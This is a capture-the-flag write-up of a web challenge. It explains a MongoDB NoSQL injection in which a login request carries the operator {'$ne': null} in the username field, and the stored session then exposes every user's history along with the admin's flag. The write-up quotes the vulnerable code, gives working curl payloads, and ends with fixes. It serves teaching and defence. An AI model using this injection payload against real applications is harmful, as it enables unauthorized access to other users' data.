---
title: "SQLi Payload Generator"
date: 2026-05-01
categories:
  - Web
tags:
  - Web
  - NCKUCTF
collections:
  - NCKUCTF
---


{{< admonition tldr "TL;DR" >}}

**SQLi Payload Generator** is a web challenge from **NCKUCTF**. - **Category:** Web Exploitation - **Title:** Just a SQL Injection payload generator, More than 100,000 times more useful than sqlmap. - **Target:** `https://chall.nckuctf.org:28134/`

{{< /admonition >}}

## Question Information

- **Category:** Web Exploitation
- **Title:** Just a SQL Injection payload generator, More than 100,000 times more useful than sqlmap.
- **Target:** `https://chall.nckuctf.org:28134/`

## Summary

Even though the title of the challenge refers to SQL Injection, the main vulnerability is actually **NoSQL Injection against MongoDB**. The application receives the `username` value directly from the JSON request, then saves it to the session without data type validation. The session value is then reused as a MongoDB query filter on the main page.

As a result, attackers can log in using MongoDB operators, for example `{"$ne": null}` , so that query history on the main page is no longer limited to one user. Because the application stores the flag as a history entry belonging to user `admin` , the flag can be read immediately after successful login.

## Technical Analysis of Vulnerabilities

### 1. Input `username` is used directly in the login query

In the `login()` function, the application retrieves `username` directly from the JSON body:

```python
username = request.json.get("username")
password = request.json.get("password")

hashed_password = hashlib.sha256(password.encode()).hexdigest()

user = users_collection.find_one(
    {"username": username, "password": hashed_password}
)
```

The problem is, `username` is not confirmed to be a string. Because the backend uses MongoDB, attackers can send objects such as:

```json
{"username":{"$ne":null},"password":"probe_pass"}
```

The object will be treated as a MongoDB query operator, not as a regular username.

### 2. The raw `username` value is saved to the session

If the login is successful, the application saves the raw `username` value to the session:

```python
if user:
    session["username"] = username
```

This means that if `username` contains a MongoDB operator object, that object will remain stored and influence subsequent requests.

### 3. Session is reused as a query history filter

On the endpoint `/` , the application retrieves history with the following query:

```python
for item in history_collection.find({"username": session["username"]}).sort(
    "created_at", -1
):
```

If `session["username"]` is `{"$ne": null}` , then the query changes to:

```python
{"username": {"$ne": null}}
```

This query will return all documents that have the `username` field, including the history of `admin` .

### 4. Flags are saved as admin's history

During database initialization, the application adds flags to the `history` collection:

```python
history_collection.insert_one(
    {
        "_id": str(uuid.uuid4()),
        "username": "admin",
        "payload_type": "flag",
        "field": "secret",
        "custom_value": "flag",
        "generated_payload": flag,
        "created_at": datetime.datetime.utcnow(),
        "favorite": False,
    }
)
```

Thus, when the history of all users is successfully displayed, the flag is also exposed in the `generated_payload` column.

## Exploitation Methodology

## Methodology 1: Register a regular account

First, create your own account so we know a valid password.

```bash
curl -ksS https://chall.nckuctf.org:28134/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"probe_user","password":"probe_pass"}'
```

Expected response:

```json
{"message":"Registration successful"}
```

## Methodology 2: Login using the MongoDB operator on the `username` field 

Next, log in using the newly created account password, but send `username` as the operator object:

```bash
curl -ksS https://chall.nckuctf.org:28134/login \
  -c cookies.txt \
  -H 'Content-Type: application/json' \
  -d '{"username":{"$ne":null},"password":"probe_pass"}'
```

Why this request was successful:

1. The backend continues to hash the password `probe_pass` .
2. The hash matches the `probe_user` account that was previously registered.
3. The `username: {"$ne": null}` condition will match any user whose `username` field has a value other than `null` .
4. After the query finds our account, the application saves the `{"$ne": null}` object into the session.

## Methodology 3: Access the main page with the injected session

After logging in, open the main page using the saved session cookie:

```bash
curl -ksS https://chall.nckuctf.org:28134/ -b cookies.txt
```

At this stage, the backend runs a history query based on session values that have been contaminated by MongoDB operators:

```python
{"username": {"$ne": null}}
```

As a result, the main page displays the history of many users, including user `admin` .

## Methodology 4: Retrieve flags from HTML response

To make it easier to extract flags from the HTML response, use `rg` :

```bash
curl -ksS https://chall.nckuctf.org:28134/ -b cookies.txt | rg 'CGGC\{[^}]+\}'
```

## Flags

```text
CGGC{nosql_injection_with_mongodb_is_fun}
```

## Root of the Problem

This vulnerability occurs due to a combination of several design errors:

1. JSON input from the user is trusted without data type validation.
2. The raw value of the request is saved directly to the session.
3. The session value is reused as part of the MongoDB query.
4. Sensitive data in the form of flags is stored in collections which can be exposed through incorrect queries.

## Improvement Recommendations

To prevent similar cases, some improvements that should be implemented are:

1. Validate that `username` and `password` are always of type string.
2. Do not save objects from requests directly to the session; save only validated identifiers.
3. Use a strict input validation scheme for all JSON endpoints.
4. Avoid storing sensitive data in locations that can be read by regular application features.

## Conclusion

This challenge is a good example of how a seemingly simple application can fail not because of classic SQL Injection, but because of **NoSQL Injection** and the use of insecure sessions. The exploit requires neither brute force nor admin access; Just create a regular account, log in using the MongoDB operator, then read the history which includes the admin's flag.
